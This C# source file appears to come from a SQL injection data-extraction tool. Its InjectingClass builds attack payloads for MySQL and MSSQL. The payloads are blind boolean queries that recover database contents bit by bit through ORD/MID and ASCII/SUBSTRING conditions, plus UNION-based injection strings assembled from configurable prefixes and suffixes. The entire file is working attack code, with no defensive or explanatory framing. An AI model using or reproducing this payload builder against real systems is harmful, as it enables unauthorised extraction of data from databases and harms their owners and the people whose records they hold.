using System;
using System.Collections.Generic;

namespace ToolSet.DatabaseExtractorCode.DBExtractor
{
   public class InjectingClass
   {
      public string InjectBegin { get; set; }

      public string InjectEnd { get; set; }

      public string InjectCondition { get; set; }

      public string UnionQueryBegin { get; set; }

      public string UnionQueryEnd { get; set; }

      public InjectingClass()
      {
         InjectBegin = string.Empty;
         InjectEnd = string.Empty;
         InjectCondition = string.Empty;

         UnionQueryBegin = string.Empty;
         UnionQueryEnd = string.Empty;
      }


      public List<string> InjectConditionQueries(string data, int charIndex, int asciIposition, int asciImax,
                                                 DataBaseType dbType)
      {
         switch (dbType)
         {
            case DataBaseType.Mssql:
               return ConditionQueriesMssql(data, charIndex, asciIposition, asciImax);
            case DataBaseType.MySql:
               return ConditionQueriesMySql(data, charIndex, asciIposition, asciImax);
            default:
               return null;
         }
      }

      private List<string> ConditionQueriesMySql(string data, int charIndex, int asciIposition, int asciiMax)
      {
         var queries = new List<string>();
         for (int w = 1; (asciIposition + w) <= asciiMax; w = w * 2)
         {
            queries.Add(
               InjectString(
                  " ORD(MID((" + data + ")," + charIndex + ",1))&" + Convert.ToString(asciIposition + w) + ">0", true));
         }
         return queries;
      }

      private List<string> ConditionQueriesMssql(string data, int charIndex, int asciiPosition, int asciiMax)
      {
         var queries = new List<string>();
         for (int w = 1; (asciiPosition + w) <= asciiMax; w = w * 2)
         {
            queries.Add(
               InjectString(
                  " ASCII(SUBSTRING((" + data + ")," + charIndex + ",1))&" + Convert.ToString(asciiPosition + w) + ">0",
                  true));
         }
         return queries;
      }

      public List<string> InjectUnionQueries(List<string> unionQueries)
      {
         var newUnionQueries = new List<string>();

         foreach (string query in unionQueries)
            newUnionQueries.Add(InjectString(UnionQueryBegin + query + UnionQueryEnd, false));

         return newUnionQueries;
      }

      public string InjectUnionQuery(string data)
      {
         return InjectString(UnionQueryBegin + data + UnionQueryEnd, false);
      }

      private string InjectString(string query, bool useCondition)
      {
         if (useCondition)
            return InjectBegin + InjectCondition + query + InjectEnd;

         return InjectBegin + query + InjectEnd;
      }
   }
}